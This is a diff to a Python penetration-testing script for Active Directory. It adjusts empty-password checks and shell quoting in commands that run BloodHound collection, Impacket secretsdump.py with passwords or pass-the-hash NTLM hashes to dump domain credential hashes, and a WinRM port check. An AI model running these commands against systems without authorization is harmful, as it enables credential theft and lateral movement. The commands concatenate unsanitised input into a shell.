@@ -2544,7 +2544,7 @@ while True:
       if checkParams != 1:
          print ("[*] Enumerating, please wait...\n")     
          
-         if PAS[:2] != "''":
+         if PAS[:2] != '""':
             command("bloodhound-python -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -c all -ns " + TIP.rstrip(" "))
          else:
             print("[i] Using HASH value as password credential...")
@@ -2590,12 +2590,12 @@ while True:
       checkParams = testTwo()
       
       if checkParams != 1:
-         print("[*] Enumerating, please wait...\n")
-         if PAS[:2] != "''":
-            command(keyPath + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") + "'@" + TIP.rstrip(" ") + " > secrets.tmp")
+         print("[*] Enumerating, please wait...")
+         if PAS[:2] != '""':
+            command(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + "' > secrets.tmp")
          else:
             print("[i] Using HASH value as password credential...")
-            command(keyPath + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")
+            command(keyPath + "secretsdump.py '" + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "' -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")
             
          command("sed -i '/:::/!d' secrets.tmp")
          command("sort -u secrets.tmp > ssecrets.tmp")         	
@@ -2655,7 +2655,7 @@ while True:
       
       if checkParams != 1:
       
-         if PAS[:2] != "''":
+         if PAS[:2] != '""':
             checkParams = testFour("5985")            
             
             if checkParams != 1:
